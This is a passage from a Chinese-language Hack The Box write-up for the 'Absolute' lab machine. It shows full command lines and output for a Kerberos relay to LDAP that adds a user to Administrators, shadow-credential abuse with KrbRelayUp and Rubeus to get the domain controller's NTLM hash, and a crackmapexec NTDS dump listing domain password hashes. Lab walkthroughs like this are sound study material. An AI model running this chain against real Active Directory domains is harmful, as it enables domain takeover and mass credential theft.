[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e1fcb9415fbc27ffe350a3538ea96cffb02b4d92abc30719d1222ec74892af26adbef784241566bd953ae423960ebb0fcf10ed4682774b3b7bfa7f0d15ab583356ad9ff9b51123615ed05fcecced189688b5b629e85db06ff6b458f11669bf21fdc4f320ef379cc7d2b6c70fef200
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a24404422090ee1d4a63d9fdb1eabcfa5323d906c4c90d37398659053f7573ac2f7c3386c37a9b410f1250ca0c1c51890d28aede293d315bf5a125b3461839163d2c2c4e4fd7
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
```

这一次LDAP bind成功了。继续通过将winrm_user用户添加到Administrators组来充分利用此漏洞。

``` bash
*Evil-WinRM* PS C:\programdata> .\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 ".\KrbRelay1.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"

[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay1.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABXmOFkCjduDHUSM3VtL2fUAoQAAOwU//9NMvzhG3NliiIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP/

[*] Forcing SYSTEM authentication
[*] Using CLSID: 8f5df053-3013-4dd8-b5f4-88214e81c0cf
[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105aa003020112a103020104a282048a04820486bf6166466d1481cd39da3d867fe96ef4450d9f73d25c91cedeb5d24898544528958527ac2511aed99a0c525d162988b0d7cb97cebf08b294f49ae15de3171a235262160b832623510bc259f325c2f9dcb15065aacf93528a7679609fcd2f964bb95eb41c807a857143df058095d867fb6768e890944f1952a2a229ec42ab0d1c0da09dad76bd41fc86be012aeab49eac7d278b90ad588f86c3bb8dbccfebd821428019ce1fe9dd47987fad4c5d21c565b85d3bbd3979b6257d5e01d3aa7a89db4bf8ddb1929d06d09942da6138fb27695de110d14e996dc2726355c15dc5f86980128c7127c3271700429eb60619b04cf25d0b5d066bda884412140454129f8b4b2d161ba42368787234db1f05e3ce7c998c569e5848fed11656f79e2be2b7db9d21dcbc3bd88cdc5b26fee5c35c584e46c460d58c387671a0cfcd806b2678c000ebcb11419151234dcbb75fb900c76cda5d5b492f149cc40c1cf2cb3bed4ade7b4e89186c2e7c59c4f1e30f7d3c46cebb29a5b9ebb6495ccbbd5898797a312c95c831201d69d53eb4aad664d582eca06b5500d2b8d998b3d767d6be5e0599cb4cec23dad7db51502dc3a9e1aa2efbc51bac2c4ebfd987bfeae0b0b0b0a80f6f01341003d49dac6e7e88f58632b97609bec38da8889a5ff4d62df743a18669eb76c2fa6e0415de817fac150a67e7eb49565d1b9208e72bd48f66c2ab962cb2401c644a532ecbe247fc1a49f42b2dd207516d7592e43461a507608a8574008e828a33f73473bff3e6e540a63889cd3965ae3768f50cccff7fb39123d03481d2d652ddf61b044026b47fad571e2250f0140f691115091b895bdc8570a1833f1715d1c866d85cf5991ff237bbeebdf14a48201a33082019fa003020112a28201960482019228bb5d87238eeb5f37e430a10fe6db4723da025cba81d5365183ec4c8e1cb4c8f9586d1c5a883b8e6860f6d4d53c112d04ad465dcd2e7a980b1bd9b47b9afb6080320ecaf1e57a49277068e71db65613c388aeb60b055d6e9054eeeb3e04a84175864c62a1cea3632da1ac133c0d29bd7a1e990c15a62d140b68b9045d03564294e10d0b9903d82484670162772891db384b8609cff6744a547d42f5b998254fd4e346db6dadf33d0596f1d8c626500ee83f14175af022a8a6664bce949709fdb5bd481ffd4230ac201f36c54442640680b
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e0d110db7e857467e22dd2c6abd7d119ba3e6eaf0902d0add637a2ff05f073dc4c87b625a20b07ae638bbb8f8ccc50c61e2301
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a24404426d9b38d41c9a01934ab60aa86020a905ec532d3c8d6d6d717c257a00ed441e4be408
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute17.png)

KrbRelay给出LDAP被成功修改。退出并重新登录以使更改生效，然后验证更改。

winrm_user现在是Administrators组的一员。

``` bash
*Evil-WinRM* PS C:\Users\winrm_user\Documents> net user winrm_user
User name                    winrm_user
Full Name
Comment                      Used to perform simple network tasks
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/9/2022 1:25:51 AM
Password expires             Never
Password changeable          6/10/2022 1:25:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/9/2022 7:13:12 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *Protected Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\winrm_user\Documents> cat C:\Users\Administrator\Desktop\root.txt
e9cefad9242174ae18798c39f2c275d5
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute18.png)

#### KrbRelayUp
#### 失败

KrbRelayUp使用KrbRelay常见的攻击法并将其自动化。但是它们都不太管用。

[SharpCollection KrbRelayUp.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/KrbRelayUp.exe)上传后使用RunasCs运行它

``` bash
*Evil-WinRM* PS C:\programdata> .\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 ".\KrbRelayUp.exe relay -m shadowcred -cls {8F5DF053-3013-4dd8-B5F4-88214E81C0CF}"

KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] Generating certificate
[+] Certificate generated
[+] Generating KeyCredential
[+] KeyCredential generated with DeviceID f77553c7-6126-4d1f-b698-da682ae36a0a
[+] KeyCredential added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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 -cep hD8=vP2#vB4/
```

但是，这条命令不起作用。那是因为它要spawn一个shell，但是有什么机制阻碍了它。

#### success

它要求用以下参数运行KrbRelayUp.exe spawn，可以用help或GitHub README查看参数意义:

 - -m shadowcred - abusing shadow creds
 - -d absolute.htb - domain to target
 - -dc dc.absolute.htb - domain controller
 - -ce MIIKQAIBAz... - base64-encoded certificate
 - -cep hD8=vP2#vB4/ - password for the certificate

KrbRelayUp报告它成功地运行了，并为计算机帐户创建了shadow creds。可以尝试以不同的方式使用此证书/密码。从[Sharp Collection Rubeus.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe)中获取Rubeus.exe并上传它。使用以下选项的asktgt命令:

 - /user:DC$ - User为机器帐号
 - /certificate:MIIKQAIBAz... - shadow credential的证书
 - /password:"tW6@oE8=tX0@" - shadow credential的密码
 - /getcredentials - 使用TGT请求一个U@U服务ticket和账户的NT hash
 - /show - 显示结果
 - /nowrap - don’t wrap output

``` bash
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:DC$ /certificate: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 /password:"hD8=vP2#vB4/" /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN="CN=DC", OU=Domain Controllers, DC=absolute, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  DC$
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  5/31/2023 8:54:55 AM
  EndTime                  :  5/31/2023 6:54:55 PM
  RenewTill                :  6/7/2023 8:54:55 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  lOCaUrm24hV/GszpClf8XA==
  ASREP (key)              :  3059A5A48E3F9FCBEC45B9FCF2759666

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A7864AB463177ACB9AEC553F18F42577
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute19.png)

#### DC Sync

目前为止，与之交互的所有帐户都在[Protected Users group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)中，这就是阻止NTLM身份验证的原因。

``` bash
*Evil-WinRM* PS C:\programdata> net user winrm_user
User name                    winrm_user
Full Name
Comment                      Used to perform simple network tasks
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/9/2022 1:25:51 AM
Password expires             Never
Password changeable          6/10/2022 1:25:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/31/2023 8:44:50 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Protected Users
The command completed successfully.
```

DC帐户不在*Protected Users组中，因此可以使用之前U2U恢复的NTLM hash进行身份验证。

DC帐户也可以这样做，可以通过crackmapexec来完成这个操作:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:c-ip) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] c-ip\DC$:A7864AB463177ACB9AEC553F18F42577
SMB         dc.absolute.htb 445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         dc.absolute.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.absolute.htb 445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
SMB         dc.absolute.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.absolute.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
SMB         dc.absolute.htb 445    DC               J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
SMB         dc.absolute.htb 445    DC               M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
SMB         dc.absolute.htb 445    DC               D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
SMB         dc.absolute.htb 445    DC               s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
SMB         dc.absolute.htb 445    DC               j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
SMB         dc.absolute.htb 445    DC               n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
SMB         dc.absolute.htb 445    DC               m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
SMB         dc.absolute.htb 445    DC               l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
